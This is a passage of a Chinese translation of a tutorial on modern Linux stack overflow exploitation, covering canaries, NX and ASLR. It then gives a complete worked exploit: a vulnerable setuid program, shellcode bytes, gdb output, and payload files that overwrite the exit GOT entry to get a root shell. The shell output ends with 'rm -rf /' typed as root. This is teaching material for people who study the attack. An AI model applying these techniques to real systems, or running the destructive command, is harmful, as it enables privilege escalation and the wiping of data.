让我们来回顾下整个过程，缓冲区被溢出了，数据被复制到缓冲区外面并且覆盖掉了那个“金丝雀”值（译者注: windows 上面也有类似的机制，不过在windows上这个值叫做安全cookies ）同时也覆盖掉了函数的返回地址。但是，悲剧的是在函数就要返回到那个被改写的地址继续执行的时候，函数检查了下那个金丝雀值是不是被改写了。于是函数没有返回而是执行另外一个函数安全的让进程退出了。现在坏消息来了，对于一个攻击者并没有一个很好的方式来绕过这个检测。你可能会想到暴力猜解那个金丝雀值。但是这个值每次都不同，除非你非常的幸运被你猜到了 （译者注：概率：</span><span style="color:#800080;">1</span>/<span style="color:#800080;">2</span>^<span style="color:#800080;">32</span><span style="color:#000000;">），而且这样做也是费时而且容易被发现的。但是还有好消息，那就是在很多的情况下这个并不能阻止溢出攻击。举例来说，栈里面的金丝雀值只是保护SIP不被非法的改写，但是它不能阻止函数的局部变量被改写。这就很容易导致下一步的溢出，这会在下面的文章里演示。上面讲的保护机制有效的阻止我们老的攻击方式的攻击，但是马上这种保护机制就会失效。

</span><span style="color:#800080;">4.2</span><span style="color:#000000;"> NX:不可执行内存

你可能注意到我们不仅仅去掉了</span>-fno-stack-protector这个标识，同时也去掉了-zexecstack标识，（也就是允许执行栈中的代码）现代的操作系统是不允许这种情况发生的，系统把需要写入数据的内存标识为可行，把保存指令的内存标识为可执行，但是不会有一块内存被同时标识为可写和可执行的。因此我们既不能在可执行的内存区域写入我们的shellcode 也不能在可写入的地方执行我们的shellcode （译者注：哈哈 系统的保护错误很变态吧 本来内存就只要可读 或者 可写属性 后来加入的 可执行 属性大大增强了系统的安全性）。我们需要另外的一种方式来让欺骗程序执行我们的代码，答案就是ROP（Return-<span style="color:#000000;">Oriented Programming），这个技巧就是使用程序中已经有的代码片段，也就是位于可执行文件的.text节里面代码，使用一种方式将这些代码片段链到一起使他们看来就像我们以前的shellcode。关于此，我不会深入的讲解，但是我会在文件的结尾给大家一个例子。还是让我先展示下如果程序如果执行堆栈里的代码会发送的情况（肯定是执行失败了）。

</span>-----------------------------------<span style="color:#000000;">

$ cat nx.c

</span><span style="color:#0000ff;">int</span> main(<span style="color:#0000ff;">int</span> argc, <span style="color:#0000ff;">char</span> **<span style="color:#000000;">argv) {

</span><span style="color:#0000ff;">char</span> shellcode[] =

<span style="color:#800000;">"</span><span style="color:#800000;">\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\xff\xc0\x48\xff</span><span style="color:#800000;">"</span>

<span style="color:#800000;">"</span><span style="color:#800000;">\xc7\x5e\x48\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48</span><span style="color:#800000;">"</span>

<span style="color:#800000;">"</span><span style="color:#800000;">\x31\xff\x0f\x05\xe8\xd9\xff\xff\xff\x48\x61\x78\x21</span><span style="color:#800000;">"</span><span style="color:#000000;">;

</span><span style="color:#0000ff;">void</span> (*func)() = (<span style="color:#0000ff;">void</span> *<span style="color:#000000;">)shellcode;

func();

}

$ gcc nx.c </span>-o nx -<span style="color:#000000;">zexecstack

$ .</span>/<span style="color:#000000;">nx

Hax</span>!<span style="color:#000000;">$

$ gcc nx.c </span>-<span style="color:#000000;">o nx

$ .</span>/<span style="color:#000000;">nx

Segmentation fault (core dumped)

</span>-----------------------------------<span style="color:#000000;">

我们把我们要执行的代码放到了堆栈上的一个数组里，然后让一个函数指针指向这个数组，然后执行这个函数。当我们编译的时候和之前一样带上 –zexecstack，我们的shellcode 就会执行，但是如果不带上这个选项，栈空间就会被标识为不可执行的，程序也就会随着一个段错误而执行失败。

</span><span style="color:#800080;">4.3</span><span style="color:#000000;"> ASLR:地址空间随机化

我们为了演示那个经典的溢出攻击，做的最后一件事就是关掉 ASLR，通过在root下执行echo </span><span style="color:#800000;">"</span><span style="color:#800000;">0</span><span style="color:#800000;">"</span> &gt; /proc/sys/kernel/<span style="color:#000000;">randomize_va_space 。ASLR可以确保每次程序被加载的时候，他自己和他所加载的库文件都会被映射到虚拟地址空的不同地址处。这就意味着我们不能使用我们自己在gdb里面调试时的地址了。因为这个程序在运行的时候这个地址有可能变成另外一个。要注意当你调试一个程序的时候 gdb 会关掉ASLR。但是我们可以在调试的时候打开这个选项，以便我们可以更真实的看到程序执行时发送的一切，具体看下面的演示

(输出的过长字符串在右边截断了，左边显示的地址信息才是最重要的):

</span>-----------------------------------<span style="color:#000000;">

$ gdb </span>-q ./<span style="color:#000000;">oldskool

Reading symbols </span><span style="color:#0000ff;">from</span> /home/me/.hax/vuln/<span style="color:#000000;">oldskool...done.

(gdb) </span><span style="color:#0000ff;">set</span> disable-<span style="color:#000000;">randomization off

(gdb) </span><span style="color:#0000ff;">break</span><span style="color:#000000;"> main

Breakpoint </span><span style="color:#800080;">1</span> at <span style="color:#800080;">0x4005df</span>: file oldskool.c, line <span style="color:#800080;">11</span><span style="color:#000000;">.

(gdb) run

Starting program: </span>/home/me/.hax/vuln/<span style="color:#000000;">oldskool

Breakpoint </span><span style="color:#800080;">1</span>, main (argc=<span style="color:#800080;">1</span>, argv=<span style="color:#800080;">0x7fffe22fe188</span>) at oldskool.c:<span style="color:#800080;">11</span>

<span style="color:#800080;">11</span> go(argv[<span style="color:#800080;">1</span><span style="color:#000000;">]);

(gdb) i proc map

process </span><span style="color:#800080;">6988</span><span style="color:#000000;">

Mapped address spaces:

Start Addr End Addr Size Offset objfile

</span><span style="color:#800080;">0x400000</span> <span style="color:#800080;">0x401000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span> /home/me/.hax/<span style="color:#000000;">vuln

</span><span style="color:#800080;">0x600000</span> <span style="color:#800080;">0x601000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span> /home/me/.hax/<span style="color:#000000;">vuln

</span><span style="color:#800080;">0x601000</span> <span style="color:#800080;">0x602000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x1000</span> /home/me/.hax/<span style="color:#000000;">vuln

</span><span style="color:#800080;">0x7f0e120ef000</span> <span style="color:#800080;">0x7f0e122a4000</span> <span style="color:#800080;">0x1b5000</span> <span style="color:#800080;">0x0</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7f0e122a4000</span> <span style="color:#800080;">0x7f0e124a3000</span> <span style="color:#800080;">0x1ff000</span> <span style="color:#800080;">0x1b5000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7f0e124a3000</span> <span style="color:#800080;">0x7f0e124a7000</span> <span style="color:#800080;">0x4000</span> <span style="color:#800080;">0x1b4000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7f0e124a7000</span> <span style="color:#800080;">0x7f0e124a9000</span> <span style="color:#800080;">0x2000</span> <span style="color:#800080;">0x1b8000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7f0e124a9000</span> <span style="color:#800080;">0x7f0e124ae000</span> <span style="color:#800080;">0x5000</span> <span style="color:#800080;">0x0</span>

<span style="color:#800080;">0x7f0e124ae000</span> <span style="color:#800080;">0x7f0e124d0000</span> <span style="color:#800080;">0x22000</span> <span style="color:#800080;">0x0</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7f0e126ae000</span> <span style="color:#800080;">0x7f0e126b1000</span> <span style="color:#800080;">0x3000</span> <span style="color:#800080;">0x0</span>

<span style="color:#800080;">0x7f0e126ce000</span> <span style="color:#800080;">0x7f0e126d0000</span> <span style="color:#800080;">0x2000</span> <span style="color:#800080;">0x0</span>

<span style="color:#800080;">0x7f0e126d0000</span> <span style="color:#800080;">0x7f0e126d1000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x22000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7f0e126d1000</span> <span style="color:#800080;">0x7f0e126d3000</span> <span style="color:#800080;">0x2000</span> <span style="color:#800080;">0x23000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fffe22df000</span> <span style="color:#800080;">0x7fffe2300000</span> <span style="color:#800080;">0x21000</span> <span style="color:#800080;">0x0</span><span style="color:#000000;"> [stack]

</span><span style="color:#800080;">0x7fffe23c2000</span> <span style="color:#800080;">0x7fffe23c3000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span><span style="color:#000000;"> [vdso]

</span><span style="color:#800080;">0xffffffffff600000</span> <span style="color:#800080;">0xffffffffff601000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span><span style="color:#000000;"> [vsyscall]

(gdb) run

The program being debugged has been started already.

Start it </span><span style="color:#0000ff;">from</span> the beginning?<span style="color:#000000;"> (y or n) y

Starting program: </span>/home/me/.hax/vuln/<span style="color:#000000;">oldskool

Breakpoint </span><span style="color:#800080;">1</span>, main (argc=<span style="color:#800080;">1</span>, argv=<span style="color:#800080;">0x7fff7e16cfd8</span>) at oldskool.c:<span style="color:#800080;">11</span>

<span style="color:#800080;">11</span> go(argv[<span style="color:#800080;">1</span><span style="color:#000000;">]);

(gdb) i proc map

process </span><span style="color:#800080;">6991</span><span style="color:#000000;">

Mapped address spaces:

Start Addr End Addr Size Offset objfile

</span><span style="color:#800080;">0x400000</span> <span style="color:#800080;">0x401000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span> /home/me/.hax/<span style="color:#000000;">vuln

</span><span style="color:#800080;">0x600000</span> <span style="color:#800080;">0x601000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span> /home/me/.hax/<span style="color:#000000;">vuln

</span><span style="color:#800080;">0x601000</span> <span style="color:#800080;">0x602000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x1000</span> /home/me/.hax/<span style="color:#000000;">vuln

</span><span style="color:#800080;">0x7fdbb2753000</span> <span style="color:#800080;">0x7fdbb2908000</span> <span style="color:#800080;">0x1b5000</span> <span style="color:#800080;">0x0</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fdbb2908000</span> <span style="color:#800080;">0x7fdbb2b07000</span> <span style="color:#800080;">0x1ff000</span> <span style="color:#800080;">0x1b5000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fdbb2b07000</span> <span style="color:#800080;">0x7fdbb2b0b000</span> <span style="color:#800080;">0x4000</span> <span style="color:#800080;">0x1b4000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fdbb2b0b000</span> <span style="color:#800080;">0x7fdbb2b0d000</span> <span style="color:#800080;">0x2000</span> <span style="color:#800080;">0x1b8000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fdbb2b0d000</span> <span style="color:#800080;">0x7fdbb2b12000</span> <span style="color:#800080;">0x5000</span> <span style="color:#800080;">0x0</span>

<span style="color:#800080;">0x7fdbb2b12000</span> <span style="color:#800080;">0x7fdbb2b34000</span> <span style="color:#800080;">0x22000</span> <span style="color:#800080;">0x0</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fdbb2d12000</span> <span style="color:#800080;">0x7fdbb2d15000</span> <span style="color:#800080;">0x3000</span> <span style="color:#800080;">0x0</span>

<span style="color:#800080;">0x7fdbb2d32000</span> <span style="color:#800080;">0x7fdbb2d34000</span> <span style="color:#800080;">0x2000</span> <span style="color:#800080;">0x0</span>

<span style="color:#800080;">0x7fdbb2d34000</span> <span style="color:#800080;">0x7fdbb2d35000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x22000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fdbb2d35000</span> <span style="color:#800080;">0x7fdbb2d37000</span> <span style="color:#800080;">0x2000</span> <span style="color:#800080;">0x23000</span> /lib/x86_64-linux-

<span style="color:#800080;">0x7fff7e14d000</span> <span style="color:#800080;">0x7fff7e16e000</span> <span style="color:#800080;">0x21000</span> <span style="color:#800080;">0x0</span><span style="color:#000000;"> [stack]

</span><span style="color:#800080;">0x7fff7e1bd000</span> <span style="color:#800080;">0x7fff7e1be000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span><span style="color:#000000;"> [vdso]

</span><span style="color:#800080;">0xffffffffff600000</span> <span style="color:#800080;">0xffffffffff601000</span> <span style="color:#800080;">0x1000</span> <span style="color:#800080;">0x0</span><span style="color:#000000;"> [vsyscall]

</span>-----------------------------------<span style="color:#000000;">

我们把</span><span style="color:#800000;">"</span><span style="color:#800000;">disable-randomization</span><span style="color:#800000;">"</span><span style="color:#000000;">设置成 “off” 。我们两次运行了程序然后查看进程的模块在内存中映射的地址。我们发现他们中的大部分的地址都是不同的。但是并不是每一个模块都这样，这就是在ASLR被开启的情况下，漏洞仍然可以利用成功的关键原因。
</span><span style="color:#800080;">5</span><span style="color:#000000;">. 现代的栈溢出攻击

虽然有这么多的保护措施，但是还是有溢出漏洞，而且有时我们可以成功的利用这些漏洞。我已经向你们演示栈中的金丝雀可以保护程序在溢出的情况下不跳到恶意的SIP去执行。但是这只金丝雀仅仅被放到了SIP的前面而不是在栈中的局部变量里面。所以我们可以使用第一个例子里面覆盖SIP（也就是函数返回地址 函数返回的时候SIP就会被赋予这个值）的那种方法来覆盖函数的局部变量。而这个会导致许多不同的问题，在一些情况下，我们覆盖了一个函数指针，这个指针会在未来某一个时刻被执行。也有可能我们覆盖了一个指针，这个指针指向的内存会在未来被写入用户数据，于是攻击者就可以在任意的位置写入数据了。类似的情形经常会被成功的利用而得到进程的控制权。下面的代码就演示了这样的一个漏洞：

</span>-----------------------------------<span style="color:#000000;">

$ cat stackvuln.c

#include </span>&lt;stdio.h&gt;<span style="color:#000000;">

#include </span>&lt;<span style="color:#0000ff;">string</span>.h&gt;<span style="color:#000000;">

#include </span>&lt;unistd.h&gt;<span style="color:#000000;">

#include </span>&lt;stdlib.h&gt;

<span style="color:#0000ff;">#define</span> MAX_SIZE 48

<span style="color:#0000ff;">#define</span> BUF_SIZE 64

<span style="color:#0000ff;">char</span><span style="color:#000000;"> data1[BUF_SIZE], data2[BUF_SIZE];

</span><span style="color:#0000ff;">struct</span><span style="color:#000000;"> item {

</span><span style="color:#0000ff;">char</span><span style="color:#000000;"> data[MAX_SIZE];

</span><span style="color:#0000ff;">void</span> *<span style="color:#000000;">next;

};

</span><span style="color:#0000ff;">int</span> go(<span style="color:#0000ff;">void</span><span style="color:#000000;">) {

</span><span style="color:#0000ff;">struct</span><span style="color:#000000;"> item item1, item2;

item1.next </span>= &amp;<span style="color:#000000;">item2;

item2.next </span>= &amp;<span style="color:#000000;">item1;

memcpy(item1.data, data1, BUF_SIZE); </span><span style="color:#008000;">//</span><span style="color:#008000;"> Whoops, did we mean MAX_SIZE?</span>
<span style="color:#000000;">
memcpy(item1.next, data2, MAX_SIZE); </span><span style="color:#008000;">//</span><span style="color:#008000;"> Yes, yes we did.</span>
<span style="color:#000000;">
exit(</span>-<span style="color:#800080;">1</span>); <span style="color:#008000;">//</span><span style="color:#008000;"> Exit in shame.</span>
<span style="color:#000000;">
}

</span><span style="color:#0000ff;">void</span> hax(<span style="color:#0000ff;">void</span><span style="color:#000000;">) {

execl(</span><span style="color:#800000;">"</span><span style="color:#800000;">/bin/bash</span><span style="color:#800000;">"</span>, <span style="color:#800000;">"</span><span style="color:#800000;">/bin/bash</span><span style="color:#800000;">"</span>, <span style="color:#800000;">"</span><span style="color:#800000;">-p</span><span style="color:#800000;">"</span><span style="color:#000000;">, NULL);

}

</span><span style="color:#0000ff;">void</span> readfile(<span style="color:#0000ff;">char</span> *filename, <span style="color:#0000ff;">char</span> *buffer, <span style="color:#0000ff;">int</span><span style="color:#000000;"> len) {

FILE </span>*<span style="color:#000000;">fp;

fp </span>= fopen(filename, <span style="color:#800000;">"</span><span style="color:#800000;">r</span><span style="color:#800000;">"</span><span style="color:#000000;">);

</span><span style="color:#0000ff;">if</span> (fp !=<span style="color:#000000;"> NULL) {

fread(buffer, </span><span style="color:#800080;">1</span><span style="color:#000000;">, len, fp);

fclose(fp);

}

}

</span><span style="color:#0000ff;">int</span> main(<span style="color:#0000ff;">int</span> argc, <span style="color:#0000ff;">char</span> **<span style="color:#000000;">argv) {

readfile(</span><span style="color:#800000;">"</span><span style="color:#800000;">data1.dat</span><span style="color:#800000;">"</span><span style="color:#000000;">, data1, BUF_SIZE);

readfile(</span><span style="color:#800000;">"</span><span style="color:#800000;">data2.dat</span><span style="color:#800000;">"</span><span style="color:#000000;">, data2, BUF_SIZE);

go();

}

$ gcc stackvuln.c </span>-<span style="color:#000000;">o stackvuln

$ sudo chown root:root stackvuln

$ sudo chmod </span>+s ./<span style="color:#000000;">stackvuln

</span>-----------------------------------<span style="color:#000000;">

为了演示我加入了一个 hax() 函数，很明显这个就是我们要把进程的执行路径改写到的位置。一开始我想加入一个例子来使用ROP链来执行一个函数 像是 system 但是因为两个理由我决定不这么做了，第一就是这样有点超出本文的范围了，这对初学者来说还太难。第二就是在这个小程序里面找到合适的函数实在太难。使用这个函数（hax()）是因为：由于NX，我们不能将我们自己的shellcode压到栈里面然后执行它，但是我们可以重用在程序中已有的代码（可以是一个函数，也可以是一个ROP链起来的一连串指令）。如果你关心如果使用ROP你可以谷歌 “ROP exploitation”。

我们程序的溢出发生在go()函数。它创建了一个两个struct item类元素的循环链表。第一次拷贝实际上向结构里面复制了过多的字节，这就运行我们覆盖掉第二次调memcpy使用的next指针，所以如果我们能够选择性的覆盖掉next指针我们就能让第二次复制的时候将数据写到我们希望的地方。除此之外我们还控制了data1和data2,因为这两个缓冲区的内容都是从文件中读取的。当然这些数据也可能从网络或者其他的一些输入，我选择文件是因为它让我们很容易改变playload （shellcode 的载体）来做演示。现在我们可以向任意我们想要的地方写入48字节了，但是我们怎样通过这个来获得程序的控制权？

我们即将使用一个叫做 GOT</span>/<span style="color:#000000;">PLT 的结构。我会马上解释下它是什么，但是如果你需要的更多的了解，你可以google下。 .got.plt 是一个地址表，城市使用它来跟踪库中的函数，我前面已经说过ASLR确保每一个动态链接库文件每一次在程序加载的时候都会被映射到不同的基址上面。所以程序就不能使用静态的绝对地址来应用库文件中的函数。程序使用了一个代理（stub）去计算函数真实的地址，并把它存放到一个表里面。所以每当函数需要被调用的时候，就需要使用到.got.plt表里面存放的地址。

我们利用这一点来改写这个地址，这样下一次程序需要调用那个函数的时候，函数的调用就会被转移到我们代码上面，就像前面我们改写函数的返回地址来转义程序的执行目标。如果我们观察下我们的例子，会发现在调用完memcpy 之后紧接着就调用了函数exit() 。如果我们可以改写.got.plt表里面exit()函数的那一项，那么当函数去调用exit()函数的时候就会跳去执行我们代码而不是libc 中的 exit() 。我们使用那一个地址去覆盖呢？你猜对了，就是函数hax()的地址。首先，还是让我为你演示下.got.plt表在调用exit()函数的时候是如果起作用的。

</span>-----------------------------------<span style="color:#000000;">

$ cat exit.c

#include </span>&lt;stdlib.h&gt;

<span style="color:#0000ff;">int</span> main(<span style="color:#0000ff;">int</span> argc, <span style="color:#0000ff;">char</span> **<span style="color:#000000;">argv) {

exit(</span><span style="color:#800080;">0</span><span style="color:#000000;">);

}

$ gcc exit.c </span>-o exit -<span style="color:#000000;">g

$ gdb </span>-q ./<span style="color:#000000;">exit

Reading symbols </span><span style="color:#0000ff;">from</span> /home/me/.hax/plt/<span style="color:#000000;">exit...done.

(gdb) disas main

Dump of assembler code </span><span style="color:#0000ff;">for</span><span style="color:#000000;"> function main:

</span><span style="color:#800080;">0x000000000040051c</span> &lt;+<span style="color:#800080;">0</span>&gt;: push %<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x000000000040051d</span> &lt;+<span style="color:#800080;">1</span>&gt;: mov %rsp,%<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x0000000000400520</span> &lt;+<span style="color:#800080;">4</span>&gt;: sub $<span style="color:#800080;">0x10</span>,%<span style="color:#000000;">rsp

</span><span style="color:#800080;">0x0000000000400524</span> &lt;+<span style="color:#800080;">8</span>&gt;: mov %edi,-<span style="color:#800080;">0x4</span>(%<span style="color:#000000;">rbp)

</span><span style="color:#800080;">0x0000000000400527</span> &lt;+<span style="color:#800080;">11</span>&gt;: mov %rsi,-<span style="color:#800080;">0x10</span>(%<span style="color:#000000;">rbp)

</span><span style="color:#800080;">0x000000000040052b</span> &lt;+<span style="color:#800080;">15</span>&gt;: mov $<span style="color:#800080;">0x0</span>,%<span style="color:#000000;">edi

</span><span style="color:#800080;">0x0000000000400530</span> &lt;+<span style="color:#800080;">20</span>&gt;: callq <span style="color:#800080;">0x400400</span><span style="color:#000000;">

End of assembler dump.

(gdb) x</span>/i <span style="color:#800080;">0x400400</span>

<span style="color:#800080;">0x400400</span> : jmpq *<span style="color:#800080;">0x200c1a</span>(%rip) # <span style="color:#800080;">0x601020</span><span style="color:#000000;">

(gdb) x</span>/gx <span style="color:#800080;">0x601020</span>

<span style="color:#800080;">0x601020</span> : <span style="color:#800080;">0x0000000000400406</span>

-----------------------------------<span style="color:#000000;">

可以看出在main</span>+20的地方，应该是调用libc 里面的exit ，但是却调用0x400400，这个地方就是exit函数的代理，它就会定位到0x601020这个地址然后从中读取函数的地址去执行，此时这个地址还是在got.plt 里。当加载libc 的时候这个地方就会被填充上exit真实的地址。而我们就是要覆盖掉这个地址为我们自己 函数的入口地址。为了让我们的例子可以正常的工作，我们必须定位到.got.plt 中exit函数的地址，然后覆盖掉这个结构中的指针，我们需要向data2这个缓冲区中写入hax()函数的指针，首先覆盖掉item1.next 这个指针，让它指向 .got.plt 中exit的入口，然后使用hax()的地址来覆盖掉此处exit()函数的地址。然后调用exit的时候，实际上是调用了我们的函数hax（）。然后我们就会得到一个系统的root shell,但是有一点要注意，以及 execl 函数刚好被定位在exit 函数的后面，而我们的memcpy函数需要复制 <span style="color:#800080;">48</span><span style="color:#000000;"> 个字节，所以我们需要保证 execl的地址不被改写。

</span>-----------------------------------<span style="color:#000000;">

(gdb) mai i sect .got.plt

Exec file:

`</span>/tmp/stackvuln/stackvuln<span style="color:#800000;">'</span><span style="color:#800000;">, file type elf64-x86-64.</span>

<span style="color:#800080;">0x00601000</span>-&gt;<span style="color:#800080;">0x00601050</span> at <span style="color:#800080;">0x00001000</span><span style="color:#000000;">: .got.plt ALLOC LOAD DATA HAS_CONTENTS

(gdb) x</span>/10gx <span style="color:#800080;">0x601000</span>

<span style="color:#800080;">0x601000</span>: <span style="color:#800080;">0x0000000000600e28</span> <span style="color:#800080;">0x0000000000000000</span>

<span style="color:#800080;">0x601010</span>: <span style="color:#800080;">0x0000000000000000</span> <span style="color:#800080;">0x0000000000400526</span>

<span style="color:#800080;">0x601020</span> &lt; fclose@got.plt&gt;: <span style="color:#800080;">0x0000000000400536</span> <span style="color:#800080;">0x0000000000400546</span>

<span style="color:#800080;">0x601030</span> &lt; memcpy@got.plt&gt;: <span style="color:#800080;">0x0000000000400556</span> <span style="color:#800080;">0x0000000000400566</span>

<span style="color:#800080;">0x601040</span> &lt; exit@got.plt&gt;: <span style="color:#800080;">0x0000000000400576</span> <span style="color:#800080;">0x0000000000400586</span><span style="color:#000000;">

(gdb) p hax

$</span><span style="color:#800080;">1</span> = {&lt; text variable, no debug info &gt;} <span style="color:#800080;">0x40073b</span>

-----------------------------------<span style="color:#000000;">

好了可以看出 exit 函数的入口在 </span><span style="color:#800080;">0x601040</span><span style="color:#000000;"> ,而hax()是在0x40073b，下面让我们来构造我们的playload。

</span>-----------------------------------<span style="color:#000000;">

$ hexdump data1.dat </span>-<span style="color:#000000;">vC

</span><span style="color:#800080;">00000000</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> |AAAAAAAAAAAAAAAA|

<span style="color:#800080;">00000010</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> |AAAAAAAAAAAAAAAA|

<span style="color:#800080;">00000020</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> <span style="color:#800080;">41</span> |AAAAAAAAAAAAAAAA|

<span style="color:#800080;">00000030</span> <span style="color:#800080;">40</span> <span style="color:#800080;">10</span> <span style="color:#800080;">60</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> |@.`.....|

<span style="color:#800080;">00000038</span><span style="color:#000000;">

$ hexdump data2.dat </span>-<span style="color:#000000;">vC

</span><span style="color:#800080;">00000000</span> 3b <span style="color:#800080;">07</span> <span style="color:#800080;">40</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">86</span> <span style="color:#800080;">05</span> <span style="color:#800080;">40</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> <span style="color:#800080;">00</span> |;.@.......@.....|

<span style="color:#800080;">00000010</span>

-----------------------------------<span style="color:#000000;">

在第一次调用中，我们使用48个字节的无用数据然后使用.got.plt表入口的地址来覆盖掉next指针。记住由于我们是在小端机器上面，所以地址的字节顺序是反着的。第二个文件包含了函数 hax() 的指针，也就是要被写到 .got.plt 表中的 exit 入口的地址。第二个地址是execl()函数的入口，第二个地址是execl的，这个是我们构造的正确的地址 只是为了让这个函数可以正常的调用。当exit 被调用的时候，实际调用的是我们 hax() 函数的地址，也就是说这个时候hax() 函数被执行了。

</span>-----------------------------------<span style="color:#000000;">

$ .</span>/<span style="color:#000000;">stackvuln

bash</span>-<span style="color:#800080;">4.2</span><span style="color:#000000;"># whoami

root

bash</span>-<span style="color:#800080;">4.2</span># rm -rf /</pre> 
   </div> 
   <p>&nbsp;</p> 
   <div> 
    <div>
     【作者】
     <a href="http://www.cnblogs.com/sky-heaven/" rel="nofollow">张昺华</a> 
    </div> 
    <div>
     【出处】
     <a href="http://www.cnblogs.com/sky-heaven/" rel="nofollow">http://www.cnblogs.com/sky-heaven/</a> 
    </div> 
    <div>
     【博客园】 
     <a href="http://www.cnblogs.com/sky-heaven/" rel="nofollow">http://www.cnblogs.com/sky-heaven/</a> 
    </div> 
    <div>
     【新浪博客】 
     <a href="http://blog.sina.com.cn/u/2049150530" rel="nofollow">http://blog.sina.com.cn/u/2049150530</a> 
    </div> 
    <div>
     【知乎】 
     <a href="http://www.zhihu.com/people/zhang-bing-hua" rel="nofollow">http://www.zhihu.com/people/zhang-bing-hua</a> 
    </div> 
    <div>
     【我的作品---旋转倒立摆】 
     <a href="http://v.youku.com/v_show/id_XODM5NDAzNjQw.html?spm=a2hzp.8253869.0.0&amp;from=y1.7-2" rel="nofollow">http://v.youku.com/v_show/id_XODM5NDAzNjQw.html?spm=a2hzp.8253869.0.0&amp;from=y1.7-2</a> 
    </div> 
    <div>
     【我的作品---自平衡自动循迹车】 
     <a href="http://v.youku.com/v_show/id_XODM5MzYyNTIw.html?spm=a2hzp.8253869.0.0&amp;from=y1.7-2" rel="nofollow">http://v.youku.com/v_show/id_XODM5MzYyNTIw.html?spm=a2hzp.8253869.0.0&amp;from=y1.7-2</a> 
    </div> 
    <div>
     【新浪微博】 张昺华--sky
    </div> 
    <div>
     【twitter】 @sky2030_
    </div> 
    <div>
     【facebook】 张昺华 zhangbinghua
    </div> 
    <div>
     本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利.
    </div> 
   </div> 
  </div> 
 </div> 
</div>
  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="https://uzstatic-360cdn.belost.xyz/theme/default/images/logo.png" alt="柚子社区">
  <div class="col-box-title name">NotBeCN</div>
  <!-- <p>最新资讯</p> -->
  <p class="contact">
    
    <a href="mailto:fandyvon@163.com" target="_blank">邮箱</a>
    
    <a href="https://uzshare.com" target="_blank">柚子社区</a>
    
    <a href="https://uzzz.org" target="_blank">找组织</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">最新</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/2019/05/14/zxh1220_90138586.html">[原创软件] [软件发布] 定时备份文件发送邮箱，不再怕数据丢失了</a></li>
    
      <li><a class="post-link" href="/2019/05/14/weixin_45037290_90140056.html">Get智能写作满月记 ——产品篇</a></li>
    
      <li><a class="post-link" href="/2019/05/14/nulio__90138386.html">《深度探索C++对象模型》..............</a></li>
    
      <li><a class="post-link" href="/2019/05/13/qq_41248707_90140031.html">mysql 多表联查之连接查询</a></li>
    
      <li><a class="post-link" href="/2019/05/13/qq_21122683_90125902.html">golang基础(二)</a></li>
    
      <li><a class="post-link" href="/2019/05/13/1557726108256.html">今日份的PTA刷题</a></li>
    
      <li><a class="post-link" href="/2019/05/12/zzzfffei_90137366.html">Android之折线图</a></li>
    
